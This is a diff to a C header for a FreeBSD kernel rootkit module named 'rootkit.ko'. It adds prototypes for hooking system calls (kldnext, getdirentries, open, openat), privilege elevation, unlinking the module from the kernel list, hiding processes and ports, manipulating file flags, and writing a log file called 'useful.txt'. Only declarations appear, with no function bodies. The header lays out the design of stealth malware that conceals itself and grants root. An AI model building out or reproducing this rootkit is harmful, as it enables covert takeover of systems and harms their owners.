@@ -29,6 +29,7 @@
 
 #define LINKER_FILE "rootkit.ko"
 #define MODULE_NAME "rootkit"
+#define LOGFILE "useful.txt"
 
 
 #define R_FLAG_READ		0b00000001
@@ -62,19 +63,32 @@ struct node {
 	uint8_t flags;
 };
 
+// Hooks
+int insert_hooks(void);
+int remove_hooks(void);
 int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
 int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
 int hook_sys_open(struct thread *, struct open_args *);
 int hook_sys_openat(struct thread * td, struct openat_args * uap);
 
-
+// Additional functions
 void elevate(struct thread *td);
+
+// Kernel Object Manipulation
+int mod_unlink(struct module *module, int cmd, void *arg);
 int process_hiding(char * p_name);
 int port_hiding(u_int16_t lport);
 
+// File system permission manipulation
 int add_file(char * uaddr);
 int remove_file(char * uaddr);
 int check_file(char * uaddr);
 int set_flag_bits(char * uaddr, uint8_t flags);
 int unset_flag_bits(char * uaddr, uint8_t flags);
 uint8_t get_flags(char * uaddr);
+
+// File writer
+int filewriter_closelog(struct thread *td, int fd);
+int filewriter_openlog(struct thread *td, int *fd, char *path);
+int filewriter_writelog(struct thread *td, int fd, char *line, u_int len);
+
